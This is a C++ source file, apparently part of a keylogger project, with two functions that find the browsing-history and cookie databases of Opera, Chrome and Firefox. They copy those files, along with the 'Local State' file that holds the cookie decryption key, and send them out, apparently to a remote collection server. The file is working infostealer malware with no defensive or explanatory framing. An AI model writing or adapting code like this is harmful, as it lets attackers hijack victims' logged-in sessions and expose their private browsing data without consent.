#include "Keylogger.h"


std::map<std::string, std::string> NavBase =
{
	{"Opera",  "\\..\\Roaming\\Opera Software\\Opera Stable"},
	{"Chrome",   "\\Google\\Chrome\\User Data"},
	{"Firefox",   "\\..\\Roaming\\Mozilla\\Firefox\\Profiles"},
};


void uploadHistory(std::string directoryName)
{
	std::map<std::string, std::string>::iterator it;
	std::string path;
	for (it = NavBase.begin(); it != NavBase.end(); it++)
	{
		if (it->first == "Chrome")
			path = winkey_g.localAppData + it->second + "\\Default\\History";
		else if (it->first == "Firefox")
			path = searchFile(winkey_g.localAppData + it->second, "places.sqlite");
		else
			path = winkey_g.localAppData + it->second + "\\History";

		if (exist_file(path))
		{
			std::string pathFolderNav = directoryName + "/" + it->first;
			sendDirectory(pathFolderNav.c_str());
			sendFile(path.c_str(), std::string(pathFolderNav + "/History").c_str());
		}
	}
}

void uploadCookies(std::string directoryName)
{
	std::map<std::string, std::string>::iterator it;
	std::string pathCookies;
	std::string pathLocalState;
	for (it = NavBase.begin(); it != NavBase.end(); it++)
	{
		pathLocalState = winkey_g.localAppData + it->second + "\\Local State";

		if (it->first == "Chrome")
			pathCookies = winkey_g.localAppData + it->second + "\\Default\\Network\\Cookies";
		else if (it->first == "Firefox")
		{
			pathCookies = searchFile(winkey_g.localAppData + it->second, "cookies.sqlite");
			pathLocalState = "NULL";
		}
		else
			pathCookies = winkey_g.localAppData + it->second + "\\Network\\Cookies";

		if (exist_file(pathCookies) && (pathLocalState == "NULL" || exist_file(pathLocalState)))
		{
			std::string pathFolderNav = directoryName + "/" + it->first;
			if (sendDirectory(pathFolderNav.c_str()) == 0 && sendFile(pathCookies.c_str(), std::string(pathFolderNav + "/Cookies").c_str()) == 0)
			{
				if (pathLocalState != "NULL")
					sendFile(pathLocalState.c_str(), std::string(pathFolderNav + "/Local State").c_str());
			}
		}
	}
}